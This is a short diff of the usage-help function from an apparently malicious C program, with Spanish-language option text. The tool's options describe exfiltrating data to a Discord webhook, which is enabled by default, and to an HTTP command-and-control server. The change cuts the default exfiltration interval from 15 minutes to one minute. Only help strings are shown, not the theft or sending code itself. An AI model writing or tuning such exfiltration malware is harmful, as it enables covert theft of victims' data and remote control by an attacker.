@@ -965,7 +965,7 @@ void print_usage(const char *prog_name) {
     printf("Opciones de exfiltración:\n");
     printf("  -D, --discord              Habilitar exfiltración a Discord (HABILITADO POR DEFECTO)\n");
     printf("      --discord-webhook URL Webhook URL para Discord\n");
-    printf("      --exfil-interval SEC  Intervalo de envío en segundos (default: 900 = 15 min)\n");
+    printf("      --exfil-interval SEC  Intervalo de envío en segundos (default: 60 = 1 min)\n");
     printf("  -e, --exfil                Habilitar exfiltración HTTP a servidor C2\n");
     printf("  -s, --server HOST          IP/hostname del servidor C2 (requiere -e)\n");
     printf("  -P, --exfil-port PORT      Puerto del servidor (default: %s, requiere -e)\n", EXFIL_DEFAULT_PORT);
